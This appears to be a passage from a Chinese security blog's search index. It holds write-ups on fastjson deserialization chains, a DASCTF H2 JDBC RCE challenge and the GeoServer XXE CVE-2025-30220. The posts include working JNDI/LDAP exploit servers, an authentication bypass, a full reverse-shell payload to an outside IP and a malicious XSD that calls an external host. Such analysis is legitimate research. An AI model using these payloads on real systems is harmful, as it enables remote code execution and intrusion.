来获取已有实例，并且在getProperties()中加入Runtime方法。\npackage org.example;import java.io.IOException;import java.util.Properties;public class Person &#123;    private String name;    private int age;    private int Sex;    private Properties properties;    public Person() &#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public String getName() &#123;        System.out.println(&quot;Person.getName()&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;Person.setName()&quot;);        this.name = name;    &#125;    public int getAge() throws Exception &#123;        System.out.println(&quot;Person.getAge()&quot;);        return age;    &#125;    public void setSex(int Sex)&#123;        System.out.println(&quot;Person.setSex()&quot;);        this.Sex=Sex;    &#125;    public int getSex() throws Exception &#123;        System.out.println(&quot;Person.gerSex()&quot;);        return Sex;    &#125;    public Properties getProperties() throws Exception&#123;        System.out.println(&quot;getProperties&quot;);        Runtime.getRuntime().exec(&quot;calc&quot;);        return properties;    &#125;&#125;\n\n\n然后再对其进行反序列化操作(和上面Demo中基本一致)。\nsetter方法首先进入Json.parse方法\n\n一直过到parser.parse然后步入。\n\n继续跟进到this.parse。\n\n这里是根据传入类型对其进行不同的处理，这里会跳转到12，也就是Object对象类型。\n\n这里继续跟进到this.parseObject中，然后一直跳到deserializer.deserialze\n\n跟进，然后再跟进。\n\n跟进俩次就到了。\n\n这里是进行反序列化处理的，还是继续向下跟，可以跟到下面这个key的判断这里。\n\n继续向下跟进就行，然后可以调到this.createInstance反序列化之后的函数是在这里进行构造的。\n\n可以观察到旁边的参数，是name，这个参数是接下来用于判断调用哪个参数的set方法用的，先继续向下跟进。\n\n跟到fieldDeserializer).parseField这里，这个方法就是用来调用setter和getter方法的，跟进去。\n\n走到setValue这里。\n\n继续跟进去。\n\n进入setValue之后，可以发现这就是一个根据反射来设置对象值的一段代码，往下面看可以看到invoke方法。\n\n\nProperties的getter方法就是通过这些invoke方法来执行setter&#x2F;getter方法的，继续跟，直到key&#x3D;properties。\n\n他和前面参数都不一样，他是调用get方法，会到另一个method.invoke中\n\n执行后弹出计算器。\n\nfastjson-1.2.24TemplatesImpl利用链上面分析了fastjson是通过调用getter和setter来进行序列化和反序列化操作的，因此只需要找到可以利用的getter和setter类就可以进行恶意操作。\n这里找到的是TemplatesImpl这个类加载字节码，他是通过.newInstance()方法触发的，可以找到这个getTransletInstance()。\n\n这是一个getter方法，并且其中__class中的_transletIndex的里的类会使用newInstance进行实例化。\n这里可以需要让他走到AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();可以参考CC3设置的参数，也就是_bytecodes，_name和_tfactory不能为空。除此之外还有满足fastjson调用getter和setter的一些硬性要求。\n满足条件的setter：\n\n非静态函数\n返回类型为void或当前类\n参数个数为1个\n\n满足条件的getter：\n\n非静态方法\n无参数\n返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong\n\n而这个getTransletInstance()方法是不满足这些条件的，因此我们需要找到一个可以调用getTransletInstance()方法的函数，向上寻找。\n\n找到newTransformer里面调用了该方法，并且看到其还传了一个参数，就是_outputProperties因此需要满足该参数也不为空才能满足调用条件。\n但由于其不是getter和setter方法，因此继续向上寻找，最后找到了getOutputProperties函数调用了newTransformer\n\n因此可以构造序列化参数为\n&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+ base+&quot;\\&quot;],&#x27;_name&#x27;:&#x27;cat.a&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123; &#125;,&#125;\n\n测试demo\npublic class Demo &#123;    public static void main(String[] args) throws IOException &#123;        String base = binToBase64(&quot;E://Test.class&quot;);        String fastJ = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+ base+&quot;\\&quot;],&#x27;_name&#x27;:&#x27;cat.a&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123; &#125;,&#125;&quot;;        JSON.parse(fastJ,Feature.SupportNonPublicField);    &#125;    public static String binToBase64(String filePath) throws IOException &#123;        byte[] fileContent = Files.readAllBytes(Paths.get(filePath)); // 读取文件内容        return Base64.getEncoder().encodeToString(fileContent); // 转换为Base64字符串    &#125;&#125;\n\nJdbcRowSetImpl利用链这条链就比较简单，主要是通过JNDI进行注入，利用的是setter方法。\n还是先看到JdbcRowSetImpl这个类，找到其中的setDataSourceName方法。\n\n跟到setDataSourceName中，其中会设置dataSource的值\n\n而触发点是在setAutoCommit方法中\n\n当conn&#x3D;null时，将会直接触发connect方法\n\n在connect方法中进行了调用了lookup，并且调用的是getDataSourceName来获取值，由于setter方法在反序列化时自动调用，因此只需要给dataSourceName赋值即可，并且需要添加autoCommit参数，来触发setAutoCommit方法。\n因此构造payload为\nString payload = &quot;&#123;&quot; +        &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot; +        &quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://xxx\\&quot;, &quot; +        &quot;\\&quot;autoCommit\\&quot;:1&quot; +        &quot;&#125;&quot;;\n\nRMI+Jndiserver:\nimport javax.naming.InitialContext;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;public class JNDI &#123;    public static void main(String[] args) throws Exception&#123;        InitialContext initialContext = new InitialContext();        LocateRegistry.createRegistry(1099);        Reference reference = new Reference(&quot;zGZLUXzF&quot;,&quot;zGZLUXzF&quot;,&quot;http://127.0.0.1:8085/&quot;);        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);    &#125;&#125;\n\nfastjson\npublic static void main(String[] args) throws IOException &#123;    String payload = &quot;&#123;&quot; +            &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot; +            &quot;\\&quot;dataSourceName\\&quot;:\\&quot;rmi://localhost:1099/remoteObj\\&quot;, &quot; +            &quot;\\&quot;autoCommit\\&quot;:1&quot; +            &quot;&#125;&quot;;    JSON.parse(payload);&#125;\n\n\nldap+Jndiserver\npackage org.example.jndi;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;public class jndi_ldap &#123;    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;    public static void main ( String[] tmp_args ) &#123;        String[] args=new String[]&#123;&quot;http://127.0.0.1:8085/#zGZLUXzF&quot;&#125;;        int port = 9999;        try &#123;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;, //$NON-NLS-1$                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        public OperationInterceptor ( URL cb ) &#123;            this.codebase = cb;        &#125;        @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            try &#123;                sendResult(result, base, e);            &#125;            catch ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);            String cbstring = this.codebase.toString();            int refPos = cbstring.indexOf(&#x27;#&#x27;);            if ( refPos &gt; 0 ) &#123;                cbstring = cbstring.substring(0, refPos);            &#125;            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;\n\nfastjson\npublic static void main(String[] args) throws IOException &#123;    String payload = &quot;&#123;&quot; +            &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot; +            &quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:9999/zGZLUXzF\\&quot;, &quot; +            &quot;\\&quot;autoCommit\\&quot;:1&quot; +            &quot;&#125;&quot;;    JSON.parse(payload);&#125;\n\n\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"2025-DASCTF 2025上半年赛-泽西岛(H2 JDBC RCE漏洞分析)","url":"/2025/06/23/%E6%B3%BD%E8%A5%BF%E5%B2%9B/","content":"环境搭建由于需要进行本地调试，这里进行tomcat本地环境搭建。\n题目给了一个war包，将其放入tomcat的webapp中，并在startup.bat中加入debug。\nSET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005\n\n启动环境即可开启远程调试。\n此外在idea中需要将lib以及classes添加为库，再开启jvm调试。\n绕过鉴权首先看到web.xml，其中有一些配置信息。\n&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; version=&quot;3.1&quot;&gt;  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;Jersey Web Application&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.glassfish.jersey.servlet.ServletContainer&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;jersey.config.server.provider.packages&lt;/param-name&gt;      &lt;param-value&gt;com.example.gfctf&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;Jersey Web Application&lt;/servlet-name&gt;    &lt;url-pattern&gt;/api/*&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;error-page&gt;    &lt;error-code&gt;404&lt;/error-code&gt;    &lt;location&gt;/404.jsp&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;500&lt;/error-code&gt;    &lt;location&gt;/500.jsp&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;401&lt;/error-code&gt;    &lt;location&gt;/401.jsp&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;405&lt;/error-code&gt;    &lt;location&gt;/405.jsp&lt;/location&gt;  &lt;/error-page&gt;&lt;/web-app&gt;\n\n从中我们可以发现该项目是使用的Jersey框架，并且定义了 Servlet的映射规则。\n然后可以看到AuthenticationFilter类，这个类是一个拦截器，并且实现了一些鉴权的功能。\n\n通过解读代码，可以发现拦截器验证JWT验证的条件为当路由不在拦截器里并且路由不为文件，也就是说这俩个条件任意满足一个即可不触发JWT的验证，首先知道他的白名单为&quot;&quot;, &quot;test&quot;, &quot;login&quot;, &quot;register&quot;，这些路由是不需要进行JWT验证的，而触发JDBC的路由为/testConnect很明显是不在白名单里的，因此可以尝试让isBaseFile返回ture。\nprivate static boolean isBaseFile(String path) &#123;    return !path.contains(&quot;/&quot;) &amp;&amp; path.contains(&quot;.&quot;);&#125;\n\n可以看到isBaseFile的判断，需要路径中不包含&#x2F;并且路径包含.字符。\n这里利用的是Jersey框架的路径解析的问题进行绕过的，可以看到filter方法中的第一行。\nString path = containerRequestContext.getUriInfo().getPath();\n\n这是基于ContainerRequestContext实现的获取请求Path的方法，并且使用的是getUriInfo().getPath();这会直接返回请求的路径部分，比如请求为http://127.0.0.1/api/test;test，将会直接返回api/test;test/，因此可以利用该特性来进行绕过鉴权的操作。\n这里使用;来截断，并且使用.让isBaseFile为true，从而绕过鉴权\n/api/testConnect;.\n\n\n\nH2 JDBC RCE原理+payload构造绕过鉴权之后，可以访问到目标路由/testConnect了，看到JDBCServlet类。\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.example.gfctf.controller;import java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;import java.util.Iterator;import java.util.List;import java.util.stream.Collectors;import java.util.stream.Stream;import javax.ws.rs.FormParam;import javax.ws.rs.POST;import javax.ws.rs.Path;import javax.ws.rs.Produces;@Path(&quot;/testConnect&quot;)public class JDBCServlet &#123;    private static final List&lt;String&gt; DEFAULT_JDBC_DISALLOWED_PARAMETERS = (List)Stream.of(&quot;allowLoadLocalInfileInPath&quot;, &quot;allowUrlInLocalInfile&quot;, &quot;allowPublicKeyRetrieval&quot;, &quot;autoDeserialize&quot;, &quot;queryInterceptors&quot;, &quot;allowLoadLocalInfile&quot;, &quot;allowMultiQueries&quot;, &quot;init&quot;, &quot;script&quot;, &quot;shutdown&quot;).map(String::toUpperCase).collect(Collectors.toList());    public JDBCServlet() &#123;    &#125;    public static void validateJdbcUrl(String jdbcUrl) throws IllegalArgumentException &#123;        Iterator var1 = DEFAULT_JDBC_DISALLOWED_PARAMETERS.iterator();        String disallowed;        do &#123;            if (!var1.hasNext()) &#123;                return;            &#125;            disallowed = (String)var1.next();        &#125; while(!jdbcUrl.toUpperCase().contains(disallowed));        throw new IllegalArgumentException(&quot;JDBC URL &quot; + jdbcUrl + &quot; is invalid&quot;);    &#125;    public static boolean testConnect(String jdbcUrl) &#123;        try &#123;            validateJdbcUrl(jdbcUrl);            Class.forName(&quot;org.h2.Driver&quot;);            Connection connection = DriverManager.getConnection(jdbcUrl);            boolean var2;            try &#123;                var2 = true;            &#125; catch (Throwable var5) &#123;                if (connection != null) &#123;                    try &#123;                        connection.close();                    &#125; catch (Throwable var4) &#123;                        var5.addSuppressed(var4);                    &#125;                &#125;                throw var5;            &#125;            if (connection != null) &#123;                connection.close();            &#125;            return var2;        &#125; catch (SQLException | ClassNotFoundException | IllegalArgumentException var6) &#123;            Exception e = var6;            throw new RuntimeException(e);        &#125;    &#125;    @POST    @Produces(&#123;&quot;text/plain&quot;&#125;)    public String testConnectWithParams(@FormParam(&quot;jdbcUrl&quot;) String jdbcUrl) &#123;        if (jdbcUrl != null &amp;&amp; !jdbcUrl.isEmpty()) &#123;            if (!jdbcUrl.startsWith(&quot;jdbc:h2&quot;)) &#123;                throw new IllegalArgumentException(&quot;no supported JDBC URL&quot;);            &#125; else &#123;                jdbcUrl = jdbcUrl + &quot;;FORBID_CREATION=TRUE&quot;;                return testConnect(jdbcUrl) ? &quot;Connection successful&quot; : &quot;Connection failed&quot;;            &#125;        &#125; else &#123;            throw new IllegalArgumentException(&quot;jdbcUrl is null or empty&quot;);        &#125;    &#125;&#125;\n\n这段代码主要实现了数据库的连接测试操作，并且其中有一些过滤以及限制，首先其接收jdbcUrl参数，并且要求其以jdbc:h2开头，然后会在结尾加上;FORBID_CREATION=TRUE这一字符串，这段字符主要作用是禁止创建数据库，这里是需要绕过的，看p神的文章中是因为只要将分号使用反斜线转义，分号就会变成一个普通字符串。\n然后会进行一个黑名单的过滤操作，要求不能使用黑名单中的字符，这里主要就是要绕过INIT这个字符，从而进行RCE，这里使用的是&#x2F;进行绕过，具体原理在下面debug过程中进行分析。\npayload如下：\njdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\\IT=CREATE ALIAS EXEC AS &#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\\;&#125;&#x27;\\;CALL EXEC (&#x27;cmd /c calc&#x27;)\\;AUTHZPWD=\\\n\nH2 JDBC RCE \\绕过原理这里的H2 JDBC RCE是来自于dataease这的fix。\n\n可以看到这里是将\\进行了过滤操作，因此可以猜测\\是可以进行RCE绕过的，这里来分析一下原理。\n传入参数并且在validateJdbcUrl处打下断点\n\n可以跟到这个方法中进行分析\n\n这里将上面的黑名单字符串与我们传入的字符串进行对比，如果有相匹配的就会爆出异常，如果没有就会正常走出当前方法。\n\n提前在DriverManager方法中打下断点，因为DriverManager.getConnection这里是无法打下断点的。\n\n跳转到DriverManager中，一直步过，这些都是对url和类加载器进行一些操作，直接过掉就行。\n\n直到aDriver.driver.connect，这里开始尝试连接，步入。\n\n继续步入到JdbcConnection中。\n\n继续步入到ConnectionInfo。\n\n一直步过，这里都是对url那些进行检查的。\n\n一直过到readSettingsFromURL这个方法会从传入的数据库连接 URL 中解析并提取连接所需的其他配置或设置。\n\n这个H2的RCE漏洞的问题就是在于这个字符串提取和处理这里，进入arraySplit方法中。\n\n可以发现var0就是传入的url字符串，并且其中的INIT还处于IN\\IT字符，继续向下步过到处理INIT时。\n\n可以看到IN\\IT中的\\已经消失不见了，这是因为它会“转义”紧随其后的字符。这样，\\I 会被当作普通字符 I，而不是转义符。StringBuilder 中的 var5 会将 I 直接加进去，而不是跳过，从而实现了RCE，以及正常的命令执行。\n\n反射payload反弹shell payload\njdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\\IT=CREATE ALIAS REV_SHELL AS &#x27;void rev_shell(String host, String port) throws java.lang.Exception &#123;String shell=System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)?&quot;cmd&quot;:&quot;sh&quot;\\;Process p=new ProcessBuilder(shell).redirectErrorStream(true).start()\\;java.net.Socket s=new java.net.Socket(host,Integer.valueOf(port))\\;java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed())&#123;while(pi.available()&gt;0)&#123;so.write(pi.read())\\;&#125;while(pe.available()&gt;0)&#123;so.write(pe.read())\\;&#125;while(si.available()&gt;0)&#123;po.write(si.read())\\;&#125;so.flush()\\;po.flush()\\;Thread.sleep(50)\\;try&#123;p.exitValue()\\;break\\;&#125;catch(Exception e)&#123;&#125;&#125;p.destroy()\\;s.close()\\;&#125;&#x27;\\;CALL REV_SHELL (&#x27;10.88.15.186&#x27;, &#x27;4444&#x27;)\\;AUTHZPWD=\\\n\n\n得到flag\n\n参考文章https://forum.butian.net/share/2569#/\nhttps://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6#/\nhttps://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html#/https://mp.weixin.qq.com/s/laMT4-M00t8xAY_Autdb3Ahttps://forum.butian.net/share/1233#/)\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"Geoserver未授权XXE(CVE-2025-30220)漏洞代码分析","url":"/2025/06/23/Geoserver%E6%9C%AA%E6%8E%88%E6%9D%83XXE(CVE-2025-30220)%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","content":"本文首发于奇安信攻防社区  https://forum.butian.net/article/749\n\n\n\n环境搭建https://geoserver.org/release/2.27.0/\n去官网下载bin执行文件，并添加debug模式，也就是把下面的代码加到start.sh中就可以\nJAVA_OPTS=&quot;&quot;JAVA_OPTS=&quot;$JAVA_OPTS -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:5005&quot;export JAVA_OPTS\n\n漏洞成因Geoserver未能正确处理GeoTools中的XML输入中的XSD引用，导致攻击者可以通过构造恶意的XSD文件，并远程进行加载，从而执行恶意操作。\n漏洞分析路由与功能点分析首先还是先来分析一下他的路由，其实在环境搭建好，进入主页面的时候就可以发现他是进行了一个跳转的操作的，可以看到他源码的index.html中重定向到了web&#x2F;路由。\n\n因为是Geoserver是使用Servlet进行前后端交互的，直接到web.xml中查看他的规则。\n首先是他的路由规则，他是通过Spring MVC的org.springframework.web.servlet.DispatcherServlet来进行GeoServer的请求分发的，这个Servlet会接收所以的Web请求，并根据Spring上下文定义的URL映射将请求分发给对应的控制器。\n\n然后是他的业务逻辑\n\n这里通过contextConfigLocation的上下文参数来指定配置文件位置，这里是applicationContext.xml文件和applicationSecurityContext.xml文件，这俩个文件一个是用于业务逻辑定义，另一个是用于安全设置，通过对这几个文件的搜索可以来进行业务逻辑判断。\n然后这个文件里还有一些其他的功能的Listener和Filter，比如GeoServerContextLoaderListener负责加载和初始化上下文，这些就不一一分析了。\n直接看org.springframework.web.servlet.DispatcherServlet类当中的doDispatch方法。\n\n这个方法是所有Web请求的入口点，负责将处理器和拦截器链与Web请求相匹配，这里重点分析其中的getHandler方法。\nprotected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception &#123;    if (this.handlerMappings != null) &#123;        Iterator var2 = this.handlerMappings.iterator();        while(var2.hasNext()) &#123;            HandlerMapping mapping = (HandlerMapping)var2.next();            HandlerExecutionChain handler = mapping.getHandler(request);            if (handler != null) &#123;                return handler;            &#125;        &#125;    &#125;    return null;&#125;\n\n这个方法会根据传入的HttpServletRequest来找到对应的HandlerExecutionChain，并返回可以处理该请求的处理器和拦截器链。其中handlerMappings是在初始化时从Spring的上下文中查找并收集的所有HandlerMapingBean，随后回到doDispatch。\n当返回了相应的处理器和拦截器链之后，在doDispatch方法中将会执行handle方法，在这里会将控制权交给实际的业务逻辑处理器，从而进入实际的业务逻辑。\n漏洞点分析这个漏洞的触发点在org.geotools.xsd.Schemas类，这里从org.geotools.xsd.impl.ParserHandler#loadSchemas方法开始看。\n\n这个方法是用于处理XSD文件的一个方法，其核心功能点在于根据XML 实例文档中提供的模式位置信息，加载所有相关的 XSD 文件，并构建一个可用于验证和查询的模式索引，其中schemas[i / 2] = Schemas.parse(location, locators, resolvers, uriHandlers);是用于处理 XSD文档加载并解析的一段代码。\n跟进这个parse方法\n\n这里主要是创建了一个ResouceSet，并将传入的参数注册到这个ResourceSet中，以便在后面的解析中使用。\n然后再跟进到下一个parse方法\n\n这个方法接收一个URL字符串(location)以及在上一个方法中配置过的ResoutceSet，并对XSD文档进行解析和加载。\n这里要需要注意的有两个地方一个是对location的处理，这里对location进行了一系列处理操作，然后就将其加入了ResoutceSet中，并且没有对ResoutceSet有什么过滤的操作。\n第二点就是触发点xsdMainResource.load(in, options);这里会执行XML解析，也就是触发点。\ndebug验证以及细节分析知道了漏洞点以及路由规则现在开始构造payload并对其中的细节进行一些分析。\n首先就是payload应该怎么构造，可以查看一下他的用户手册。\n\n可以看到GetCapablits这一操作，这个操作会向WFS capabilities服务器发送请求，以获取该服务器支持的操作和服务或功能列表，重点看schemaLocation这一参数，这个参数指定XML文档所使用的XML Schema文件的位置，这个参数的第一个值为命名空间，第二值是该命名空间内需要加载的XSD文件。\n这是一个服务器请求的操作，并且会远程加载指定的XSD文件，很自然的想到可以进行XXE攻击，我们将加载的XSD文件换成自己构造的恶意XSD就可以进行恶意请求，构造payload。\n&lt;wfs:GetCapabilities    service=&quot;WFS&quot;    version=&quot;1.0.0&quot;    xmlns:wfs=&quot;http://www.opengis.net/wfs&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation=&quot;http://192.168.24.1:8080 http://192.168.24.1:8080/evil.xsd&quot;&gt;&lt;/wfs:GetCapabilities&gt;\n\n构造的恶意.xsd文件如下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE name [    &lt;!ENTITY % dtd SYSTEM &quot;http://68d312f298.ipv6.1433.eu.org.&quot;&gt;    %dtd;    %all;]&gt;&lt;xsd:schema    xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;    xmlns:gml=&quot;http://www.opengis.net/gml&quot;    xmlns:sf=&quot;http://www.openplans.org/spearfish&quot;    elementFormDefault=&quot;qualified&quot;    targetNamespace=&quot;http://www.openplans.org/spearfish&quot;&gt;    &lt;xsd:import        namespace=&quot;http://www.opengis.net/gml&quot;        schemaLocation=&quot;http://schemas.opengis.net/gml/3.1.1/base/gml.xsd&quot; /&gt;    &lt;xsd:complexType name=&quot;archsitesType&quot;&gt;        &lt;xsd:annotation&gt;            &lt;xsd:documentation&gt;&amp;xxe;&lt;/xsd:documentation&gt;        &lt;/xsd:annotation&gt;        &lt;xsd:sequence&gt;            &lt;xsd:element name=&quot;the_geom&quot; type=&quot;gml:PointPropertyType&quot; /&gt;            &lt;xsd:element name=&quot;cat&quot; type=&quot;xsd:long&quot; /&gt;            &lt;xsd:element name=&quot;str1&quot; type=&quot;xsd:string&quot; /&gt;        &lt;/xsd:sequence&gt;    &lt;/xsd:complexType&gt;    &lt;xsd:element        name=&quot;archsites&quot;        type=&quot;sf:archsitesType&quot; /&gt;&lt;/xsd:schema&gt;\n\nwfs、wcs、wms那些路由都可以，发包。\n\n首先会被DispatcherServlet拦截进行路由以及业务逻辑处理器分配\n\n然后进入Dispatch，在这里进行请求处理，以及服务识别操作。\n\n其中的service方法就是用于服务识别的\n\n这里会识别出服务的类型是什么，并且在后续会根据识别出的服务类型进行执行操作，也就是dispatch方法。\n随后进入parseRequestXML() 这个处理XML类型的数据的方法\n\n随后一直跳转到startElement中调用loadSchemas方法的地方。\n\n到了loadSchemas方法就和之前漏洞点分析的差不多了，通过调用parse方法一直到解析XML的地方。\n\n\n至此分析完毕\n漏洞验证发送请求\n\n本地起http服务被请求\n\ndns服务器被请求\n\n漏洞修复厂商已发出新版本修复漏洞，更新至最新版本\nhttps://github.com/geoserver/geoserver/releases/tag/2.27.1\n","categories":["漏洞分析"],"tags":["漏洞分析"]}]